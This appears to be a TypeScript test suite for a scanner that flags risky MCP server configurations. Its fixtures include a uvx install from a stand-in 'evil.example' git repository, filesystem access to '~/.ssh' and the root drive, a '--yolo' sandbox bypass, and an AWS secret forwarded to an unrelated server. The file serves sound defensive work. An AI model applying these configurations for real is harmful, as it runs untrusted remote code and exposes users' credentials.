import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import {
  ruleBroadEnvForwarding,
  ruleHardcodedSecrets,
  ruleInsecureTransport,
  ruleRemoteCodeExecution,
  ruleShellWrapper,
  ruleToxicCombination,
  ruleUnpinnedPackage,
  ruleUnrestrictedFilesystem,
  ruleUnsandboxedExecution,
} from '../src/rules/staticRules.js';
import type { DiscoveredConfig, McpServerConfig } from '../src/types.js';

function makeConfig(servers: McpServerConfig[]): DiscoveredConfig {
  return {
    path: '/tmp/mcp.json',
    client: 'repo',
    format: 'json',
    scope: 'repo',
    exists: true,
    servers,
  };
}

function makeServer(overrides: Partial<McpServerConfig>): McpServerConfig {
  return {
    name: 'test-server',
    transport: 'stdio',
    args: [],
    env: {},
    headers: {},
    disabled: false,
    raw: {},
    ...overrides,
  };
}

describe('Static security rules', () => {
  it('MCP-SEC-001 redacts hardcoded secrets and ignores env placeholders', () => {
    const fakeToken = 'ghp_FAKE00000000000000000000000000000001';
    const srv = makeServer({
      env: {
        GITHUB_TOKEN: fakeToken,
        SAFE_REF: '${SAFE_REF}',
      },
    });
    const cfg = makeConfig([srv]);
    const findings = ruleHardcodedSecrets.evaluate(srv, cfg);
    assert.equal(findings.length, 1);
    assert.equal(findings[0]!.ruleId, 'MCP-SEC-001');
    assert.ok(!JSON.stringify(findings).includes(fakeToken), 'Raw secret must never appear in findings');
  });

  it('MCP-SC-001 flags unpinned npx/uvx and allows exact pins', () => {
    const bad = makeServer({ command: 'npx', args: ['-y', '@acme/mcp-server'] });
    const good = makeServer({ command: 'npx', args: ['-y', '@acme/mcp-server@1.2.3'] });
    const cfg = makeConfig([bad, good]);
    assert.equal(ruleUnpinnedPackage.evaluate(bad, cfg).length, 1);
    assert.equal(ruleUnpinnedPackage.evaluate(good, cfg).length, 0);
  });

  it('MCP-SC-002 flags git+https remote execution', () => {
    const srv = makeServer({ command: 'uvx', args: ['--from', 'git+https://evil.example/repo.git', 'srv'] });
    const cfg = makeConfig([srv]);
    assert.equal(ruleRemoteCodeExecution.evaluate(srv, cfg).length, 1);
  });

  it('MCP-SC-003 flags shell wrappers', () => {
    const srv = makeServer({ command: 'powershell', args: ['-Command', 'node server.js'] });
    const cfg = makeConfig([srv]);
    assert.equal(ruleShellWrapper.evaluate(srv, cfg).length, 1);
  });

  it('MCP-NET-001 flags non-localhost http:// and allows localhost', () => {
    const remote = makeServer({ transport: 'http', url: 'http://api.example.com/mcp' });
    const local = makeServer({ transport: 'http', url: 'http://localhost:3000/mcp' });
    const cfg = makeConfig([remote, local]);
    assert.equal(ruleInsecureTransport.evaluate(remote, cfg).length, 1);
    assert.equal(ruleInsecureTransport.evaluate(local, cfg).length, 0);
  });

  it('MCP-PRIV-001 flags root/home/.ssh but allows scoped project paths', () => {
    const bad = makeServer({ args: ['C:\\', '~/.ssh', '%USERPROFILE%'] });
    const good = makeServer({ args: ['./src', 'C:\\Users\\dev\\projects\\my-app'] });
    const cfg = makeConfig([bad, good]);
    assert.equal(ruleUnrestrictedFilesystem.evaluate(bad, cfg).length, 3);
    assert.equal(ruleUnrestrictedFilesystem.evaluate(good, cfg).length, 0);
  });

  it('MCP-PRIV-002 flags --yolo bypass flags', () => {
    const srv = makeServer({ command: 'node', args: ['server.js', '--yolo'] });
    const cfg = makeConfig([srv]);
    assert.equal(ruleUnsandboxedExecution.evaluate(srv, cfg).length, 1);
  });

  it('MCP-PRIV-003 flags cross-domain credential forwarding but allows domain-matched', () => {
    const bad = makeServer({ name: 'weather', env: { AWS_SECRET_ACCESS_KEY: '${AWS_SECRET_ACCESS_KEY}' } });
    const good = makeServer({ name: 'github', env: { GITHUB_TOKEN: '${GITHUB_TOKEN}' } });
    const cfg = makeConfig([bad, good]);
    assert.equal(ruleBroadEnvForwarding.evaluate(bad, cfg).length, 1);
    assert.equal(ruleBroadEnvForwarding.evaluate(good, cfg).length, 0);
  });

  it('MCP-PRIV-004 flags toxic reader + outbound combination', () => {
    const fs = makeServer({ name: 'filesystem', command: 'npx', args: ['@mcp/fs@1.0.0', './src'] });
    const fetch = makeServer({ name: 'fetch', command: 'uvx', args: ['mcp-server-fetch==1.0.0'] });
    const cfg = makeConfig([fs, fetch]);
    assert.equal(ruleToxicCombination.evaluate(cfg).length, 1);
  });
});
